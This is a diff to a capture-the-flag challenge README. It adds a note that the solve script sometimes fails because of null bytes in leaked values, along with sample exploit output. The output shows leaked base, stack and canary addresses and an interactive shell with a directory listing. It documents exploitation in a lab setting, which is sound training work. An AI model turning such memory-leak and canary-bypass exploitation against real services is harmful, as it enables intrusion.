@@ -46,11 +46,27 @@ $ docker run -d -p 11540:1337/tcp chall16:latest
 ## Testing Exploit
 
 By default the host and port are set to `challenge.pwny.racing` and `11540`. These can be
-overwritten by providing arguments to the `solve.py` script.
+overwritten by providing arguments to the `solve.py` script. The exploit will fail sometimes
+because of extra null bytes in various leaked addresses or the canary. Just run again if this
+happens.
 
 ```bash
 $ cd solve
 $ ./solve.py localhost 11540
 ...
+[*] leak:      0x55e9c8755c1d
+[*] base:      0x55e9c8755000
+[*] stack:     0x7ffd159d8a10
+[*] canary: 0xb1d856e117e4a500
+[+] shell? uid=999(ctf) gid=999(ctf) groups=999(ctf)
+[*] Switching to interactive mode
+$ ls -al
+total 6964
+drwxr-xr-x 1 root ctf     4096 Aug 21 19:51 .
+drwxr-xr-x 1 root root    4096 Aug 18 13:55 ..
+-r-------- 1 root ctf      107 Aug 21 19:50 .config.json
+-rwxr-x--- 1 root ctf    10224 Aug 21 18:37 chall
+---s--x--x 1 root ctf  7100702 Jul 25 16:28 flag_submitter
+-rwxr-x--- 1 root ctf       36 Jul 26 03:41 redir.sh
 
 ```
